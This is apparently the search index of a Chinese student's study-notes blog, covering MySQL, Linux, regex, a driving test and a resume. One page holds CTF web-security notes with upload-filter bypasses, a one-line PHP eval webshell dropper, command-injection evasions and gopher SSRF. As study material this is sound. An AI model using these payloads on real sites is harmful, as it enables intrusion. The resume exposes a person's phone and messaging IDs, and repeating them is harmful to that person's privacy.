{"pages":[{"title":"","text":"本博客属于学习笔记类型 如果想对我提一些建议，可以联系我的邮箱manu2x@qq.com 小博客历史","link":"/about/index.html"},{"title":"profile","text":"这并不是一份意义上的自我介绍，只是将重点挑一下 两三分钟的时间 突出自己的优点（如果可以尽量和面试岗位相关） 信心 应聘的岗位 表示感谢 比如 面试管你好，非常感谢你给我这个机会来面试，我叫xx，家住贵州三穗，现在是贵阳职业技术学院大二的学生，我的专业课成绩在班上都还不错，我的优点就是自学能力不错，和拥有不错的抗压能力。 [这段视情况而定]这些特点体现在了我的一些项目里，比如在github部署的一个静态网站，她是我的学习笔记（微笑），一旦我遇到问题，我都会按照先google后询问老师的方法去解决，并把解决方案写成一篇文章记录在我的博客里。 对于贵公司的xx岗位我很有兴趣也很信心哈，希望能得到这一个机会，谢谢。怕耽误时间就不细说了。如果你有什么想问的尽管问，我会认真回答，再次感谢！","link":"/about/profile.html"},{"title":"个人简历","text":"个人信息姓名：杨勇 电话：18085515238 微信号：PermissionNotAccess QQ：2633650083 邮箱：manu2x@qq.com 教育经历贵阳职业技术学院 网络技术 专科（2019.9.10-2021.6） 课程：C，java，python，计算机网络，网络设备(cisco)配置，计算机安全，VUE.js，前端，后端PHP… 技能编程语言： 熟悉c，python, java, php, html, css, js 熟练使用git进行版本管理 网络： 配置cisco与神州数码，锐捷网络设备 系统： 使用linux发行版Arch分支Manjaro作为主系统两年 web开发： 搭建LAMP环境 在校荣誉 参加2021年高职组信息安全管理与评估省赛并获二等奖 参加贵州省第一届职业技能大赛贵阳市选拔赛暨贵阳第二届甲秀工匠大赛网络安全获奖第一名 兴趣爱好博客：在Github上部署静态博客https://yangchaohe.github.io2年 写作：喜欢使用markdown编写文章 自我总结 做事专注，较强的自学能力，乐于助人，喜欢挑战未知","link":"/about/resume1.html"},{"title":"分类","text":"","link":"/categories/index.html"},{"title":"contact","text":"","link":"/contact/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标： 网站名称： 网站地址： 网站简介： 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"1gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;","link":"/life/Clipboard.html"},{"title":"","text":"read man BASH 了解 GOPHER 了解 .git tree","link":"/life/Todo.html"},{"title":"","text":"PHP Laravel 开发 Web 项目 (65%) PHP 1000h 计划 (16h+45min*22) 网络安全CTF-WEB 信息泄漏 目录遍历 phpinfo 备份文件（dirsearch 爆破目录） 网站源码 bak 文件 vim 缓存 Git 泄漏（GitHack） sql 注入：1.5h+1.5h+1h+2h+2h+85min 涉及的注入技术（ 手工+BP 及 sqlmap ） 布尔型盲注（Boolean-based blind） 时间型盲注（Time-based blind） 报错型注入（Error-based） 联合查询注入（UNION query-based） 堆叠查询注入（Stacked queries） 杂项 Cookie 注入：指修改 Cookie 进行注入 过滤空格 后端如果将空格作为过滤项，这时可以使用 /**/ 代替空格绕过 对于一些强大的过滤代码，还有 url 编码 %a0 绕过 UA注入：服务器根据 UA 返回对应的客户端网页（手机，电脑） 修改方法 Chrome-&gt;F12-&gt;…-&gt;More tools-&gt;Nerwork conditions Chrome 插件 Hackbar Referer 注入：来源网页 修改方法 Chrome 插件 hackbar xss 注入(https://xss.pt/)：20 min 反射型 XSS 存储型 XSS 文件上传：10h +76min+21min 无验证，直接上传 前端验证（js） 判断方法： 抓包查看是否有文件内容，没有则是前端验证 解法： 禁用 JS：Chrome-&gt;F12-&gt;Settings-&gt;Debugger-&gt;Disable JavaScript 通过前端验证后抓包修改 调试JS（不实用） .htaccess 绕过：如果目录下有 .htaccess 文件，且服务器允许配置，则可添加一条 MIME type 解析规则进行绕过 示例：将 .png 当成 php 解析 1AddType application/x-httpd-php .png MIME 校验：如果后端是验证 Content-Type，可以抓包后修改成 image/png 或者其他不会被检测的 MIME-type 绕过。（cat /etc/mime.types） 文件头绕过：后端如果验证的是文件头，可以在后门文件头部伪造成其他的文件绕过 00 截断(GET, POST)：在 PHP&lt;5.3.4 的版本中，存在 00 截断漏洞（底层 C），抓包在上传路径了添加 %00 即可忽略后面的文件名 双写后缀绕过： 审记源码 123$name = basename($_FILES['file']['name']);$blacklist = array(&quot;php&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;, &quot;htaccess&quot;, &quot;ini&quot;);$name = str_ireplace($blacklist, &quot;&quot;, $name); 漏洞：双写后缀，如 .pphphp 条件竞争：利用后台先上传后检查的漏洞暴力植入后门脚本 示例文件 1&lt;?php fputs(fopen('xiao.php','w'),'&lt;?php eval($_REQUEST[1]);?&gt;');?&gt; move_uploaded_file(tmp_file, path) : 对于php&lt;5.3.4的版本可以使用00截断，实际上 path 也会被 /. 截断 RCE (remote command/code execute): +85min+30min+79min eval 执行（system, exec, passthru） 文件包含 php://input (php.ini: allow_url_include=on) 用于执行php代码 POST 的 body 里面写 木马语句 远程包含：同上 php://filter (php.ini: allow_url_include=on)：用于读取源码 命令注入 过滤空格 ( &lt;, &lt;&gt;, $IFS ) 过滤cat（ less, more？） 过滤 / (还有 &amp;&amp;, ||, ;) 过滤 &amp;&amp;、||( ; ) 过滤 | || &amp; &amp;&amp; ; / cat flag ctfhub [:space:] 我们知道 linux 下的 的换行符是 \\r , url 编码是 %0a (0a 在 ascii 里就是 \\r) 利用 %0a 就能执行其他命令。 利用 ${IFS}代替空格，ca\\t 代替 cat， fla\\g代替 flag 就可以获取flag了。 ps： 还能使用空的变量绕过过滤的名字，比如 f${i_am_null}lag SSRF (Server-side request forgery) 30min + 8h 内网访问 伪协议读取文件 ( file:/// ) 端口扫描（BP 内网爆破） POST请求（gopher://） 上传文件（gopher://） FastCGI 协议（漏洞脚本 exp, gopher://） Redis 协议（RESP 协议，抓包，gopher;//） URL bypass (url 认证机制 @) 数字IP bypass (我 tm 直接 localhost，或者 7f000001) 302跳转 Bypass (localhost) 正常逻辑应该是先访问302页面，gopher多转一次 url 编码 DNS Rebinding (利用 DNS TTL 的漏洞) 密码学：+5h+30min English 过一遍新概念","link":"/life/Tree.html"},{"title":"","text":"","link":"/life/index.html"},{"title":"","text":"如果你有什么建议或者问题，那么就在这里说出来吧！","link":"/message/index.html"},{"title":"","text":"这是我的笔记，以思维导图的形式呈现 web web开发 网络理论知识: 计算机网络(面试版) 实践+理论: 网络设备管理 参考思科技术学院教程 数据库 数据库基础 计算机色彩 参考文章 sRGB 和 NTSC 色域的区别在哪里？ 调色名词浅析——色彩空间与色域（上）","link":"/mindmap/index.html"},{"title":"音乐歌单收藏","text":"--- 温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"《c++ primer plus》 《计算机网络(第五版)》 《鸟哥的Linux私房菜 基础学习篇 第4版》 《鸟哥的Linux私房菜 服务器架设篇 第3版》 《office效率手册》 《30天自制系统》 《计算机网络自顶向下方法 第6版》 《UNIX网络编程》（两卷本）for W.Richard Stevens 《UNIX环境高级编程》for W.Richard Stevens 《TCP/IP详解》（三卷本）for W.Richard Stevens 编程珠玑（算法） 线性代数及其应用（高数入门） Metasploit渗透测试魔鬼训练营 白帽子讲 Web 安全 程序员修炼之道 黑客与画家","link":"/read/index.html"},{"title":"标签","text":"","link":"/tags/index.html"}],"posts":[{"title":"ALTER","text":"常用ALTER语法 修改添加外键约束1234ALTER TABLE 表名ADD CONSTRAINT 外键名FOREIGN KEY (该表需要被关联的外键列名)REFRENCES 外表名 (列名) 删除外键约束12ALTER TABLE 表名DROP FOREIGN KEY 外键名 利用外键约束可以完成1对1, 多对多, 1对多关系 添加索引索引可以为表添加查询效率, 所以列数据最好唯一 12ALTER TABLE 表名ADD INDEX 索引名(列名,可多列)","link":"/Database/ALTER.html"},{"title":"数据库笔记","text":"数据库踩坑记录 变量mysql有全局变量（global），会话变量（local/session）和用户变量 全局变量使用 show global variables 可以显示全局变量。 显示mysql安装目录 123456show global variables like '%basedir%'+---------------+-------+| Variable_name | Value |+---------------+-------+| basedir | /usr/ |+---------------+-------+ 显示mysql数据库所在目录 123456show global variables like '%datadir%'+---------------+-----------------+| Variable_name | Value |+---------------+-----------------+| datadir | /var/lib/mysql/ |+---------------+-----------------+ 服务开启时可以动态的使用 set 更改一些可写变量 1set global general_log_file=&quot;/var/log/mysql/general.log&quot; 当服务重新启动时，这些变量也会变成默认值 也可以修改配置文件，当服务启动时会读取里面的变量 在archlinux系统里mariadb的默认配置文件在/etc/my.cnf和/etc/my.cnf.d/目录，我修改的是/etc/my.cnf.d/server.cnf的mysqld选项 12345[mysqld]log_error=/var/log/mysql/error.log# general会记录发送给服务器的所有SQL记录，默认关闭general_log=ONgeneral_log_file='/var/log/mysql/general.log' 显示全局变量可以用 show global variables like 'variable_name'，也可以用 select @@global.variable_name 下面一张表记录了我常用的变量 变量 功能 @@version_compile_os 系统版本 ＠＠hostname 系统名 自带的数据库information_schema这里面保存了 Mysql 服务器所有数据库的信息,如数据库名，数据库的表，表栏的数据类型与访问权限，包括变量等都是存在这里。 TABLES：有两个字段 table_name 和 table_schema，分别记录 DBMS 中的存储的表名和表名所在的数据库 COLUMNS：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表（desc tablename也一样）。 SCHEMATA：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。 STATISTICS：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。 常用函数和语句参考MySQL8.0文档 函数 功能 version() 查看当前数据库版本 database() 显示当前所处数据库 user() 当前用户 HEX() 将输入的数字或字符串输出16进制 LOAD_FILE() 以字符的形式返回文件的内容 left(a,b) 截取字符串a的前b位 substr(a,b,c) 截取字符串a从b位截到c位 if(a,b,c) a为true，返回b，否则c sleep(sec) 延迟查询sec秒数 group_concat() 将该column的值用,连接起来 concat() 将所有的参数连接起来成为字符串 语句 功能 regexp 后面接正则表达式 like 模糊查找，%_ 运算符a &lt;&gt; b：如果a!=b则为true IS NULL or &lt;==&gt;：都可以用来与NULL作比较 ＠：用户变量 ＠＠：系统变量=：在 SET 和 update 语句中是赋值的作用，在其他语句是关系运算符等于 :=：赋值 杂项slug列: 对用户和SEO友好 避免使用中文 避免使用 for 、and、if 、or 等 停用词（会被搜索引擎过滤） 保证最终的 url 尽量简短，slug 的长度保持在 3-5 个单词之间 在 slug 包含内容关键字，并选择正确的关键字 show index from table_name: 显示为该表添加的索引名 KEY与INDEX同义, 都可以建立索引, 建议不要有相同的数据, 方便查询 KEY | INDEX: MUL UNIQUE: UNI PRIMARY KEY: PRI truncate tablename:会清空表的所有记录，并且使自增的id重置。 num = 'num+1' 会报错 必须要num=num+1才行, 编程一定要小心 命令历史记录在用户主目录下.mysql_history里面 into outfile语句可以将选中的数据以 特定格式 写入文件， into dumpfile将数据以单行写入文件，通常用来输出二进制文件 更新系统权限后使用 flash privilegs 刷新权限 12MariaDB root@(none):(none)&gt; grant all privileges on sqlilabs.* to 'sqlilabs'@'%'MariaDB root@(none):(none)&gt; flush privileges; 远程访问服务器要绑定0.0.0.0地址 多表查询的字符集一定要兼容，不然会报错 1(1267, &quot;Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (utf8_general_ci,SYSCONST) for operation 'UNION'&quot;) 参考文章 mysql自带的4个数据库 MYSQL的用户变量和系统变量 Linux下远程连接MySQL数据库","link":"/Database/note.html"},{"title":"微信小程序笔记","text":"微信小程序的学习记录和坑 app.json控制着全局静态数据，比如title，backgroundcolor，tabbar..以及首页page（第一个） 注册页面有个behaviours，可以将某个页面的属性，字段，方法与当前页面合并（区分组件），需要使用module.exports = Behaviour(...)将数据暴露(区分模块)，require()引用，不支持绝对路径 Page注册普通页面，Component可以注册组件，类似标签 wxss建议采用flex布局 老老实实使用回调，但需要避免代码被割裂 考虑SPA 得到查询语句+建立数据库banner表 wx.createSelectorQuery()类DOM 注意target和currentTarget 浏览器调试后端接口没问题, 开发工具调试出问题, 不要慌, 这种大概率是请求头不对, 比如Get请求上传参数时需要对参数进行编码, 浏览器一般默认采用application/x-www-form-urlencoded, 开发工具需要自己设置下 wx.switchTab才能跳转tarbar界面 GET与POST 1.GET在浏览器回退时是无害的，而POST会再次提交请求。 2.GET产生的URL地址可以被Bookmark，而POST不可以。 3.GET请求会被浏览器主动cache，而POST不会，除非手动设置。 4.GET请求只能进行url编码，而POST支持多种编码方式。 5.GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。 6.GET请求在URL中传送的参数是有长度限制的，而POST没有。 7.对参数的数据类型，GET只接受ASCII字符，而POST没有限制。 8.GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。 9.GET参数通过URL传递，POST放在Request body中","link":"/Front-end/wechat-app.html"},{"title":"使用zeal查看官方文档","text":"zeal是一个查看官方的文档的软件，非常好用，但有些需要T子，这里列出使用时的问题 解决zeal-Content-rendering-error 把文档的路径下 Contents\\Resources\\Documents\\developer.mozilla.org\\static\\build\\js 下的react-main.&lt;hashcode&gt;.js 删除即可","link":"/Front-end/%E4%BD%BF%E7%94%A8zeal.html"},{"title":"考驾照笔记","text":"所处地区：贵州三穗 学校：铭穗 科一没什么好说的, 刷完题就完事. 科二调整座位, 后视镜 先调整座位再调整后视镜 将后视镜划为3等分, 靠里的那个点与后门把手重合即可 倒库技巧和点位评分规则: 不按路线, 没有完全入库, 车身出线, 中途停车, 扣100分 下面是我自己画的路线图, 仅供参考. 黄色为控制线, 停车需要将前轮过控制线(与肩膀平齐) 要点一 将车身摆直. 车身沿车位线1.5m行驶, 可以参考后视镜下边缘线, 身高不同, 点位也不同, 下图仅供参考. 要点二: 倒车点位右入库-出库 看左后视镜底边与控制线距离, 找到自己的点位 右方向盘打满, 看右后视镜 后轮与库边线到30cm时, 回半圈方向盘 看左后视镜, 出现库角, 及时回正方向盘(在车身平行之前) 看后视镜底边点位停车, 挂空档. 挂一档准备出库, 当左后视镜出现库前角时方向盘向左打满 车身平行时回正方向盘, 肩膀与控制线平齐停车, 回空挡挂倒挡. 左入库 与右入库差不多, 区别是第二步看左后视镜. 第四步看右后视镜. 小技巧 当车尾歪时, 想让车尾往哪边走方向盘就往哪边转 与库边线不平行会影响停车点","link":"/Life/car.html"},{"title":"动态","text":"7005d85bb8cab4279d15ba3b37c792f8336fe691b89dd17de1e54e92364e6ed52e56b4d91bd9819346e145639251ff52491931be3bf05c748b7358772dddbc61eb49b50a58cae451cfb8eb88aee09777c26af3ebef78b53bcb0915850d46127c139b75306d1f20bc13fab1985c653e1b9097a2ee72fef2f2525bd62eb66e6c45cbbd8394ad45d6568dc8d15c83dfeaa89712847c052dc78e9ee205f30aa225e7d1e9cb88e7323de77046da03102580b48d954dba5c7b625f9043e981d93edd12544cd4fecada749719e6fd612b7aec81a126249cd1c61d8516475f04a3c6e40abc4954796b901ae14828ca3d09500d41d7bd9862c7b6c23a5b27dbe39f5c7aad621ef887d66017e9c2ddd1ff336294e14ed5380e8dc9baee50b5b23c712a5a35cd40b45204f3d5e0e7fa45756096dc5d9fc2cd37a926b568827ce100ac455214b3fd3b9e0297e23ea30d481866eb4239fb39c22143560d160297838bd4dc9883ef4daa9c971ed1d99843e4ec6c76a05181315fb608911086e338f56dfa919bd18dfce1f847d35090f94dfd4fe218e1642568397718b917c6cce78ba096ca4ccfd9ea5b5c32c69bddc7ac140cc4cbdad9e4bda41f3bf8133bcffcff35b700fa533f6a1ca391b32ec64c1ba5a71d18b978423cea91885a62c724ecd49c51eaf635ffb1f5cb481e44b422eebb068f1f06236ebda9f868199c9825d62c896a5d958f2e92667089d787fc3b14ec27569d3fecb198096ae6c53f94d0b5ae97f4bc50d11a1d41d7210554029a9c3f3a0ee43d9bcb8904f8dd03db3843f3100b376768006d9ebabe8e4ed89bdee1ea8d2707f563b8e16ad3ebec2fab2f2eb1d918739750f0348199dcd655966c2196f093310fc98886b510b54457742df4cb5124b2b5078bd5a1ac7513b66b7792f0a9c0d719392e11aa76a57064388f7f5e5af55aca5d088d606ad5b17f987f255fa56fdc9343057d5c83b2605aa414cb1591d6d82f0a551d384206091a184a835fb9c4cf44e6cec59396a817e7db7663facc58e932f7346019735a664bded29916fbecc9e9d22de79266ae60eb41ba5b7b441c0208858c8b15f06bdf9a0f010e8c581239fa332b9365a6f17b64d95aaf849eb488476215d0daac24cbc1ab344a94a071518e52464576146621360caac2d8c047519d33737d89c74539cc0d50bc6e8d9e21f70d1ceed1616c2640764f0b26df6951729235857b7f6a25c9efd1b92faa9edc9c9370f1fcb1e26deb07bf10d40be32f0e622ad47d7222ac544f4803a487a2f934343bdd3956a613e3d4a29f3fd5c1477c9154c1dbf7a874a7544b46bfb2133b8f23ecf2220f1214089f414781ba35cb655eba52b624c376548ec192e01bd0f86a124a2c4c1b9756510eb39b3e19f3ee1c60b3f3c2631ff9f226f7cb14c23b29978d59511969cdceb81d35d72cb185112564e44c1f5073151a29fc154078d101f31d45bed50d14c186d3b97710dcfc44ee6d5922768132e76aada16f9f0ef071c42e383e49b5be186dfdd3e519d7dd4f5197e3ef864497482e8f693f5e300031022d94d2e131a47245a086f05f87e4411bfce704275de65fc8433658607c6936c52923751904bf070e8ef3f130335c78e2c3d52c05c477800e5e8330da4c8ab5c962a71f3e228ee59f927cb3b299c629efe0992b6c9c12eb77ed407fe17fe13fabe516fba83bb4974df1890c0739ed3529fd4a38d9256ec2ecf97a274800ff18f5e06070b281b7c9094fa4f3512bcc6b23a5dc35e6a8d4011b6ddffc47cfbe3cf64e1a2be492e424f4705094c75febc5711517c9b4fd068568cbb8214e5d4cc2fc7f3f66b615d289038e387634f93b66d5666a5b7c213a31a673b4e4475bbf18ff116bede34b2736818cfb595ea079e20d081a0bdab9b60a7fd440fd0f63e2314d8c685c0abb12e18ea7c18b38d241ac65a2818e33fe3c617c5fd4748967c32ed0cc3a75f83303c63442e1bca253256796173cdf0aa9c0410c6f7482b4c9afb310d94c46a1bfe2f2d92bcd874ea13ec1c62c4226237b22f6220206815fcdbc34bde7ab3ffd3db7fd7454c2bc3bfb1c656b7f4040bb1146fa625c93c2adb279f3699f37e409726d288371b6998568979fcfbaa20123ec888bb4b93c3a259751495de975f3c3d451104d27ed61f3717581fff6ee62b4eee72370968da09e9c7bf809a03bd5be2822c0524e61f4f3476b4838ea086baeeead4f4dc0f6294b38315fb45be5a4b948c1650b35c2c8d22f310974e96d0a40a0ef6af47bac6c4a6e25ab27445a6787a118ade3d1041632bce7acd89b Hey, password is required here.","link":"/Life/zone.html"},{"title":"（一）初识Linux","text":"前言：我为什么要学Linux？ 国内墙太厚，打算买vps自己建服务器，想学到更多知识 想体验不同系统的操作 为了更深次的理解计算机 看《30天自制操作系统》感觉自己基础不行，停留在第8天，并且前面的知识也很迷糊（虽然这本书是针对小白的，恕我比小白还白吧:&lt;），想制作一个小系统，也算对大一的自己一个目标吧 历史 1969年贝尔实验室的Ken Thompson使用汇编写了Unics系统，提出了两个重要概念 所有程序或系统设备都是文件 不管程序本身还是附属文件，所写的程序只有一个目的，且要有效地完成目标 1973年Dennis Ritchie使用C语言将Unics重新编译，并命名为UNIX(一开始并没有得到重视，源码可以被拿来做学术研究) 1977年Bill Joy发布了BSD(Berkeley Software Distribution)，因为使用了UNIK源码，被称为UNIK-like系统 1979年AT&amp;T想收回了UNIX的版权，在发行第七版时，特别声明“不可向学生提供源码”，因为版权问题造成了许多商业纠纷 1984年Andrew S.Tanenbaum为了教学生认识UNIX，不参考UNIX源码编写了Minix，能与UNIX兼容 1984年Richard Stallman提倡GNU计划，倡导自由软件(free software)，强调软件可以自由的取得，复制，修改再发行，并规范GPL授权模式，GPL的软件不可单纯的仅销售其软件，也不可修改软件授权 1991年芬兰人Linus Torvalds开发出Linux系统，他的成功离不开Minix(UNIX)、GNU、internet、POSIX及虚拟团队的产生 Linux本身是个普通的操作系统，开发网站是https://www.kernel.org，我们称他的底层数据为内核 可以查询Linux的内核版本是否长期维护 Linux的发行版组成：Linux内核+自由软件+文档（工具）+可完全安装的程序 硬盘分区 在Linux系统中，每个设备都被当成一个文件来对待，比如SATA为/dev/sd[a-d]（按读取顺序命名） 更多设备和文件名 为什么要分区？ 可以保护数据 比如C盘装系统，D盘装应用 高效的性能 当某一数据来自某一分区时，系统会锁定该分区 MBR(MS-DOS)分区表格式与限制 早期Linux为了兼容Windows磁盘，采用了MBR(Master Boot record，主引导记录)来处理引导程序和分区表 在旧磁盘第一个扇区的512字节里主要含有两个信息： MBR：可以安装启动引导程序的地方，有446字节 分区表(partition table)：64字节（参考https://blog.csdn.net/White_Idiot/article/details/80088115） 由于一组记录区有16字节，所以只能有4组记录表，每组 记录表记录了该区段的起始和结束的柱面号码 假设上面的设备为/dev/sda/，P1就是/dev/sda1 四组分区记录被称为主要(Primary)或扩展(Extended)分区 其实分区只是修改那64字节 最小单位通常叫柱面(Cylinder) 系统写入磁盘时一定要参考分区表 扩展分区的目的是使用额外的扇区来记录分区信息，扩展分区不能被格式化 由扩展分区切出来的5个分区就是逻辑分区(logical partition)，原理有点复杂 上图的设备文件名如下： P1:/dev/sda1 P2:/dev/sda2 L1:/dev/sda5 L2:/dev/sda6 L3:/dev/sda7 L4:/dev/sda8 L5:/dev/sda9 所以，1-4的文件名是留给主分区的，这是MBR的特性，其他特性 P+E的数量只能有4个 扩展分区只能有1个 逻辑分区是扩展分区划分出来的 能被格式化的只有P、L 逻辑分区的数量要看操作系统，Linux已经突破了63个的限制 另外，需要注意的是不同类型的分区不能合并，比如E和L，合并的话分区表被破坏，所有逻辑分区会被删除 由于第一扇区记录了分区表，若它损坏了，emmm硬盘就废了 由于记录每组分区的只有16字节，所有MBR有很多限制 无法使用2.2TB以上的硬盘 仅有一个区块，损坏后很难修复 引导区块只有446字节，无法存储较多的程序代码 GPT(GUID partition table)磁盘分区表 为了扩大容量，现在每个扇区已经到4K大小，为了兼容所有磁盘，GPT使用了LBA(Logical Block Address，逻辑块地址)处理，默认512字节大小，从LBA0开始编号 与MBR不同，GPT使用了34个LBA区块记录分区信息，磁盘的最后34个LBA区块也拿来做备份，更加安全 LBA0 也有两部分，一是和MBR相似的446字节，存储了第一阶段的引导程序；二是64字节放的是特殊标志符，表示这是GPT格式（程序如果不懂就不会处理，更加安全） LBA1(GPT表头记录) 记录了分区表本身的位置和大小，也记录了备份的位置，放置了分区表校验码(CRC32)，如果有错就去找备份 LBA2-33(实际记录分区信息处) 从2开始，每个LBA都记录了4组分区信息，在默认的模式下，可以有128组分区记录 因为有512字节，4组记录分区信息，所以用了128字节记录每组信息，此外每组还用了64位来记录记载开始/结束的号码 于是单元分区最大限制在2^64 x 512B = 2^30TB，emm大到爆炸 也就是说GPT每组分区都可以单独存在，每组都可以格式化 BIOS和UEFI启动检测程序 并不是所有的操作系统都能读取GPT的格式，也不是所有的“硬件（盘？）”都支持GPT格式，是否能读写又与启动检测程序有关 BIOS搭配MBR/GPT启动流程 BIOS：启动主动执行的固件，认识第一个可启动的设备 MBR：第一个启动设备的第一个扇区的主引导记录块，里面有启动引导代码 启动引导程序(boot loader)：一个可读取内核文件来执行的软件 内核文件：启动OS 如果引导程序支持GPT，也会启动GPT里的系统 另外，BIOS和MBR是硬件本身都会支持的功能，boot loader则是安装在MBR上的一个软件 boot loader的功能： 提供选项：可以选择不同的启动选项，这是多重引导的重要功能 加载内核文件：直接指向可使用的程序区段启动OS 转交给其他boot loader 这意味着计算机可以有两个以上的boot loader，启动区除了可以安装在MBR以外，还可以安装在每个分区的启动扇区(boot sector)，代表可以多重引导 为什么安装多重引导要先安装windows再安装Linux? Linux安装时，可以手动选择将boot loader安装在MBR还是别的分区的启动扇区，而且Linux的引导程序可以手动选择，所以可以将windows的启动装在Linux的启动引导程序里 而Windows在安装时，会覆盖安装的分区的MBR或启动扇区，不能选择 UEFI BIOS搭配GPT启动流程因为BIOS是16位程序，与新系统有点不搭，所以有了UEFI(Unified Extensible Firmware Interface，同一可扩展固件接口) 传统BIOS UEFI 程序语言 汇编 C 硬件资源控制 使用IRQ处理，不可变的内存存取，不可变的输入/输出存取 使用驱动程序与协议 处理器运行环境 16位 CPU保护模式 扩充方式 通过IRQ连接 直接加载驱动程序 第三方厂商支持 较差 较且可支持多平台 图形能力 较差 较佳 内置简化操作系统环境 不支持 支持 目录树 文件系统挂载到目录树上 挂载就是利用一个目录当成进入点，将磁盘分区的信息放在该目录下，进入这个目录就知道了这个分区的信息","link":"/Linux/1.%E5%88%9D%E8%AF%86linux.html"},{"title":"（十）正则表达式","text":"正则表达式(regular expression)通过一定的规则进行查找、替换、删除字符，方便用户操作。作为一个系统管理员来说，正则表达式是一个非常好的查错方法，可以从非常长的日志文件中找到出问题的地方。正则表达式分为基础正则表达式和扩展正则表达式。想用正则表达式处理字符串，要使用支持正则表达式的程序，比如vim，sed，awk 基础正则表达式1.语系对结果的影响正则表达式就是处理字符串的一种方式，字符排序（语系）将影响搜索结果 LANG=C，字符排序是0,1,2…ABC…abc… LANG=zh_CN，0123…aAbB….. 当我们使用[A-Z]搜索字符时，LANG=C会得到A-Z，LANG=zh-CN会得到Aa-Z的结果，所以语系不同，结果也不同 而为了避免这样编码造成的问题，有一些特殊符号可以解决 符号 代表意义 [:alnum:] 所有字母大小写和数字 [:alpha:] 任何字母大小写字符 [:blank:] 代表space和Tab按键 [:cntrl:] 代表控制按键，如CR,LF,Tab,Del等 [:digit:] 0-9 [:graph:] 除空格键以外的其他按键 [:lower:] a-z [:print:] 任意可以被打印出来的字符 [:punct:] 标点符号（punctuation symbol） [:upper:] A-Z [:space:] 任意会产生空白的字符 [:xdigit:] 十六进制的数字类型0-9a-fA-F 下面进行实际操作 2.grepgrep支持正则表达式，先拿他演示一下 grep是以行为单位进行查找，删除的 语法 123456789grep [-acinv] [--color=auto] '查找字符' filename-a:将二进制文件以文本的形式查找数据-c:计算‘查找字符’的数量-i:忽略大小写-n:输出行号-v:反选--color=auto:显示颜色-A:后可接数字n，表示将本行加后n行显示出来-B:后可接数字n，显示本行及前面n行 使用前请将语系设置为C 1export LANG=C;export LC_ALL=C 查找规定字符串1grep 'string' filename 查找tast和test时，发现它们都是t?st的形式，可以这样查找 1grep 't[ae]st' filename []里面不管有多少字符，都仅代表一个字符（或） [^]代表反选，[^a]代表不含a，[^a-z]&amp;[^abcd..z]都代表不含小写字母的意思 连续的字符可以这样表示：[0-9]，[a-z]，[A-Z]或者[0-9a-zA-Z] [[:lower:]]即含有小写字母的意思 行首与行尾字符^,$想查找以the开头的时使用 1grep '^the' filename 查找以小写字母开头时 12grep '^[a-z]' filenamegrep '[[:lower:]]' filename 查找非小写字母开头 1grep '^[^a-z]' filename 注意行尾的符号要看系统，wondows的换行符是^M$，Linux是^$ 查找空白行（其实一般是将它反选） 1grep '^$' filename 删除注释（行首为#，如果直接是#的话会误删） 1grep '^#' -v filename 任一字符.和重复字符* .表示一定有一个任意字符 *表示重复前一个字符，0到无穷次 查找g??d 1grep 'g..d' filename 查找god，good..即g与g中间含一个o到无数个o 1grep 'goo*d' filename 查找开头是g结尾是g（g…g） 1grep 'g.*g' filename 限定RE字符范围{}*是0-无穷个，如果想限定范围呢，就要使用{}，由于{}在shell下有其他意义（通配和替换），所以要使用\\转义 查找2个o 1grep 'o\\{2\\}' filename 查找2-5个o 1grep ' \\{2,5\\}' filename 查找2个以上的o 1grep 'o\\{2,\\}' filename 基础正则表达式字符集合 RE字符 意义 ^word 行首是word word$ 行末是word . 任一字符 \\ 转义字符 * 重复前一个字符从0到无穷多个 [list] 代表一个集合，取出一个字符 [n1-n2] 代表两字符中间的所有字符 [^list] 反选 \\{n1,n2\\} n1n2是数字，n1到n2个前一个字符 扩展正则表达式扩展正则表达式也需要支持的程序才能执行，比如egrep（grep -E） re字符 意义 + 重复前一个字符1次或无穷次 ? 重复前一个字符0-1个次 | or () 里面是一个群组，可以与|结合使用 ()+ 重复的群组","link":"/Linux/10.%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html"},{"title":"（十二）磁盘配额","text":"在多人多任务的环境中，会有多人使用同一个硬盘的情况，这时要将硬盘的容量进行均等分配，不然会影响其他用户的使用，这就是磁盘配额（quota） 一般用途 服务器网站：每个人网页空间的限制 邮件服务器：每个人邮件空间的限制、 文件服务器：每个人能使用的硬盘空间 限制用户组的磁盘容量 限制用户的磁盘容量 限制目录的容量 使用前的限制 不同的文件系统对磁盘配额的支持 ext不支持对目录的配额，xfs完美支持 查看内核是否支持磁盘配额 如果内核不支持，就不能进行磁盘配额的操作 配额只对一般用户有用 对root当然没用 若启动了SELinux，则有的目录不能参与磁盘配额 设置规范 可分别针对用户、用户组、目录进行配额限制 文件数量的限制（inode）、容量的限制（block） 限制分为硬限制（hard）、软限制（soft） 软限制是一个警告，硬限制是能使用的最大容量 宽限时间（grace time） 